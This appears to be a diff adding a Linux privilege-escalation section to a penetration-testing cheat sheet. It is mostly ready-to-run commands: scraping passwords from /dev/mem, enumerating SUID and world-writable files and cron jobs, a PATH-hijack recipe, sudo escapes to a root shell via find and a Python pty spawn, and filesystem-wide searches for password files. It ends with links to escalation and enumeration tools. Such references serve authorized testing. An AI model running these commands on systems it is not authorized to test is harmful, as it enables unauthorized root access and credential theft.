@@ -2320,6 +2320,79 @@ Function execution on clean exit
     trap testexec EXIT
 ```
 
+## Linux PrivEsc
+
+Passwords in mem (note this will likely trigger an alert)
+```
+    strings /dev/mem -n10 | grep -i PASS
+```
+
+SUID
+```
+    find / -perm -u=s -type f 2>/dev/null
+
+    or
+
+    find / -uid 0 -perm -4000 -type f 2>/dev/null
+
+    or 
+
+    find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;
+
+    Do any of these allow interactive mode or exit to shell?
+```
+
+World Writeable Files
+```
+    find / -perm -2 -type f 2>/dev/null
+
+    Locate files exec as elevated that are world mod and modify (i.e. any cron jobs?)
+
+    Example:
+
+    ls -la /etc/cron.d
+
+    Do any match the world writeable?
+
+```
+
+PATH exploit (if . in path)
+```
+    Create script with same name as common cmd (i.e. cd, ls, ipconfig)
+    Drop script in path
+    Note it's a good idea to also run the actual command at end of script
+```
+
+SUDO
+```
+    sudo -l
+
+    Use above files to escape to shell (if applicable)
+
+    sudo find /var -exec sh -i\;
+
+    sudo python -c 'import pty;pty.spawn("/bin/bash");'
+```
+
+doas
+```
+    cat /etc/doas.conf
+```
+
+Find password files (locate or find)
+```
+    locate *password*
+
+    find / -type f -exec grep -i -I "password" {} /dev/null \;
+```
+
+Additional Refs:
+https://github.com/nongiach/sudo_inject
+https://github.com/sleventyeleven/linuxprivchecker
+https://github.com/rebootuser/LinEnum
+https://github.com/pentestmonkey/unix-privesc-check
+https://github.com/diego-treitos/linux-smart-enumeration
+https://github.com/TH3xACE/SUDO_KILLER
 
 
 ## rpcclient
